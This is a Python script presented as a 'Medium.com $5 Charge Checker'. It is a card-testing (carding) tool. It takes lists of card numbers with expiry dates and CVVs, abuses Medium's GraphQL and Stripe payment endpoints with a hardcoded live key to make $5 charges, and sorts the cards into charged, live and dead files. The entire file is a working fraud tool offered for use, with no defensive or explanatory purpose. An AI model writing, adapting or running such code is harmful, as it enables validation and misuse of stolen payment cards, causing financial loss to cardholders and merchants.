"""
Medium.com $5 Charge Checker v5.0
Discovers GraphQL mutations and charges cards
"""

import requests
import random
import uuid
import time
import os
import re

# ============ CONFIG ============
INPUT_FILE = "cards.txt"
COOKIE_FILE = "cookies.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3
# ================================

def extract_cookies(content):
    cookies = {}
    pattern = r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]*)['\"]"
    for k, v in re.findall(pattern, content):
        if k in ['uid', 'sid', 'xsrf', 'cf_clearance', '_cfuvid', '_ga', 'sz', 'pr', 'tz', '__stripe_mid', '__stripe_sid']:
            cookies[k] = v
    return cookies

def load_cookies():
    if not os.path.exists(COOKIE_FILE):
        return None
    with open(COOKIE_FILE, 'r') as f:
        content = f.read()
    matches = re.findall(r'cookies\s*=\s*\{([^}]+)\}', content, re.DOTALL)
    for m in matches:
        c = extract_cookies('{' + m + '}')
        if 'uid' in c and 'sid' in c:
            return c
    return None

def get_bin_info(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=10)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','?').upper()} | {d.get('bank',{}).get('name','?')} | {d.get('country',{}).get('name','?')}"
    except:
        pass
    return cc[:6]

def discover_payment_intent(cookies):
    """Try to discover and get payment intent"""
    
    cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
    
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'cookie': cookie_str,
        'origin': 'https://medium.com',
        'referer': 'https://medium.com/plans',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'apollographql-client-name': 'lite',
        'medium-frontend-app': 'lite/main-20260116-161017-b2412ec54c',
    }
    
    if cookies.get('xsrf'):
        headers['x-xsrf-token'] = cookies['xsrf']
    
    # Try GraphQL introspection first
    introspection = {
        'query': '''{ __schema { mutationType { fields { name } } } }'''
    }
    
    try:
        r = requests.post('https://medium.com/_/graphql', headers=headers, json=introspection, timeout=30)
        data = r.json()
        if 'data' in data and data['data'].get('__schema'):
            mutations = data['data']['__schema'].get('mutationType', {}).get('fields', [])
            print(f"[*] Found {len(mutations)} mutations")
            
            # Look for payment/subscription related mutations
            for m in mutations:
                name = m.get('name', '')
                if any(x in name.lower() for x in ['payment', 'subscription', 'stripe', 'checkout', 'membership', 'intent']):
                    print(f"[*] Found: {name}")
    except Exception as e:
        print(f"[!] Introspection failed: {e}")
    
    # List of mutations to try
    mutations_to_try = [
        ('membershipCheckout', {'planId': 'monthly'}, 'mutation m($planId:String!){membershipCheckout(planId:$planId){clientSecret}}'),
        ('createMembershipCheckout', {'plan': 'monthly'}, 'mutation m($plan:String!){createMembershipCheckout(plan:$plan){clientSecret}}'),
        ('initiateMembershipPayment', {'planType': 'MONTHLY'}, 'mutation m($planType:String!){initiateMembershipPayment(planType:$planType){clientSecret}}'),
        ('startMembershipCheckout', {'planId': 'monthly'}, 'mutation m($planId:String!){startMembershipCheckout(planId:$planId){clientSecret}}'),
        ('createStripePaymentIntent', {'plan': 'monthly'}, 'mutation m($plan:String!){createStripePaymentIntent(plan:$plan){clientSecret}}'),
        ('initiateStripePayment', {'planId': 'monthly'}, 'mutation m($planId:String!){initiateStripePayment(planId:$planId){clientSecret}}'),
        ('beginSubscription', {'planType': 'monthly'}, 'mutation m($planType:String!){beginSubscription(planType:$planType){clientSecret}}'),
        ('prepareMembershipPayment', {'plan': 'monthly'}, 'mutation m($plan:String!){prepareMembershipPayment(plan:$plan){clientSecret}}'),
    ]
    
    for name, variables, query in mutations_to_try:
        try:
            payload = {'operationName': 'm', 'variables': variables, 'query': query}
            r = requests.post('https://medium.com/_/graphql', headers=headers, json=payload, timeout=30)
            data = r.json()
            
            if 'errors' not in data and 'data' in data:
                for key, val in data['data'].items():
                    if val and isinstance(val, dict) and val.get('clientSecret'):
                        secret = val['clientSecret']
                        intent_id = secret.split('_secret_')[0]
                        print(f"[+] SUCCESS! Mutation: {name}")
                        return intent_id, secret
        except:
            continue
    
    return None, None

def create_pm(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    
    guid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    
    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes.zfill(2)}&card[exp_year]={ano}&guid={guid}&muid={guid}&sid={guid}&key=pk_live_7FReX44VnNIInZwrIIx6ghjl&_stripe_version=2025-03-31.basil'
    
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
    }
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return r.json()
    except:
        return {'error': {'message': 'Request failed'}}

def confirm_pi(pm_id, pi_id, secret):
    data = f'payment_method={pm_id}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_7FReX44VnNIInZwrIIx6ghjl&client_secret={secret}&return_url=https://medium.com/welcome-member'
    
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
    }
    
    url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
    
    try:
        r = requests.post(url, headers=headers, data=data, timeout=30)
        return r.json()
    except:
        return {'error': {'message': 'Request failed'}}

def parse_result(resp):
    if 'error' in resp:
        c = resp['error'].get('decline_code') or resp['error'].get('code', '')
        m = resp['error'].get('message', '')
        
        ccn = ['incorrect_cvc', 'insufficient_funds', 'lost_card', 'stolen_card', 
               'expired_card', 'generic_decline', 'do_not_honor', 'card_velocity_exceeded',
               'authentication_required', 'try_again_later']
        
        if c in ccn or 'authentication' in m.lower():
            return 'CCN', c or 'auth_required'
        return 'DEAD', c or m
    
    status = resp.get('status', '')
    if status == 'succeeded':
        return 'CHARGED', '$5 Charged!'
    elif status == 'requires_action':
        return 'CCN', '3DS Required'
    elif status == 'processing':
        return 'CHARGED', 'Processing'
    
    return 'DEAD', status or 'Unknown'

def check_card(cookies, pi_id, secret, cc, mes, ano, cvv):
    # Create payment method
    pm_resp = create_pm(cc, mes, ano, cvv)
    
    if 'error' in pm_resp:
        c = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
        if c in ['incorrect_cvc', 'expired_card']:
            return 'CCN', c
        return 'DEAD', c or pm_resp['error'].get('message', '')
    
    pm_id = pm_resp.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM'
    
    # Confirm payment
    confirm_resp = confirm_pi(pm_id, pi_id, secret)
    return parse_result(confirm_resp)

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    MEDIUM $5 CHARGE CHECKER v5.0      ║
    ║           FOR PYDROID3                ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Load cookies
    cookies = load_cookies()
    if not cookies:
        print(f"[!] No cookies found!")
        print(f"[*] Create {COOKIE_FILE} and paste your cookies")
        with open(COOKIE_FILE, 'w') as f:
            f.write("# Paste cookies = { } block here\n")
        return
    
    print(f"[+] Cookies loaded (uid: {cookies.get('uid','')[:8]}...)")
    
    # Discover payment intent
    print("[*] Discovering payment intent...")
    pi_id, secret = discover_payment_intent(cookies)
    
    if not pi_id:
        print("[!] Could not get payment intent")
        print("[!] Make sure your account can subscribe (not already member)")
        return
    
    print(f"[+] Got payment intent: {pi_id[:20]}...")
    
    # Load cards
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("[!] No cards")
        return
    
    print(f"[*] Cards: {len(cards)}")
    print("=" * 45)
    
    charged = ccn = dead = 0
    
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        if len(parts) < 4:
            continue
        
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}...{cc[-4:]}")
        
        start = time.time()
        
        # Need fresh PI for each card after first use
        if i > 1:
            print("[*] Getting new payment intent...")
            pi_id, secret = discover_payment_intent(cookies)
            if not pi_id:
                print("[!] Could not refresh PI")
                break
        
        status, msg = check_card(cookies, pi_id, secret, cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            charged += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CHARGED|{msg}\n")
        elif status == 'CCN':
            print(f"[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            ccn += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CCN|{msg}\n")
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            dead += 1
            with open(DEAD_FILE, 'a') as f:
                f.write(f"{full}|{msg}\n")
        
        print(f"[*] {t}s")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 45)
    print(f"CHARGED: {charged} | CCN: {ccn} | DEAD: {dead}")

if __name__ == "__main__":
    main()
